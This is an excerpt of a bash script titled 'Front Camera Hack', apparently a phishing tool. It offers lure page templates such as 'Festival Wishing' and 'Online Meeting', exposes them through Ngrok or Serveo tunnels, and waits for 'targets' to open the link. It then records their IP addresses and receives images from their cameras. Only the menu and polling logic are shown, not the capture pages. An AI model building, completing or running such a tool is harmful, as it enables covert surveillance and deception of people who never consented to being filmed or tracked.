...
█▀▀ █▀█ █▀█ █▄░█ ▀█▀   █▀▀ ▄▀█ █▀▄▀█ █▀▀ █▀█ ▄▀█   █░█ ▄▀█ █▀▀ █▄▀
█▀░ █▀▄ █▄█ █░▀█ ░█░   █▄▄ █▀█ █░▀░█ ██▄ █▀▄ █▀█   █▀█ █▀█ █▄▄ █░█\e[0m \n"""
printf " \e[1;91m>>>>https://www.youtube.com/@Spy_Code <<<<\e[0m \n"
...
checkfound() {
    ...
    printf "\n"
    printf "\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
    while [ true ]; do

        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;31m[\e[0m+\e[1;31m] Target opened the link!\n"
            catch_ip
            rm -rf ip.txt
        fi
        ...
        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;31m[\e[0m+\e[1;31m] Cam file received!\e[0m\n"
            rm -rf Log.log
        fi
        sleep 0.5
...
printf "\n-----Choose a template----\n"    
printf "\n\e[1;91m[\e[0m\e[1;91m01\e[0m\e[1;91m]\e[0m\e[1;91m Festival Wishing\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;91m02\e[0m\e[1;91m]\e[0m\e[1;91m Live Youtube TV\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;91m03\e[0m\e[1;91m]\e[0m\e[1;91m Online Meeting\e[0m\n"
...
if [[ -z "$link" ]]; then
    ...
    printf "\e[1;31m[\e[0m*\e[1;31m] \e[0m\e[1;31m Ngrok authtoken is not valid\n"
    printf "\e[1;31m[\e[0m*\e[1;31m] \e[0m\e[1;31m If you are using android, turn hotspot on\n"
    printf "\e[1;31m[\e[0m*\e[1;31m] \e[0m\e[1;31m Ngrok is already running, run this command killall ngrok\n"
    printf "\e[1;31m[\e[0m*\e[1;31m] \e[0m\e[1;31m Check your internet connection\n"
    exit 1
else
...
printf "\n\e[1;91m-----█▓▒▒░░░𝑪𝒉𝒐𝒐𝒔𝒆 𝒕𝒖𝒏𝒏𝒆𝒍 𝒔𝒆𝒓𝒗𝒆𝒓░░░▒▒▓█-----\e[0m\n"  
printf "\n\e[1;91m[\e[0m\e[1;91m01\e[0m\e[1;91m]\e[0m\e[1;91m 𝐍𝐠𝐫𝐨𝐤 💀\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;91m02\e[0m\e[1;91m]\e[0m\e[1;91m 𝙎𝙚𝙧𝙫𝙚𝙤.𝙣𝙚𝙩 💀\e[0m\n"
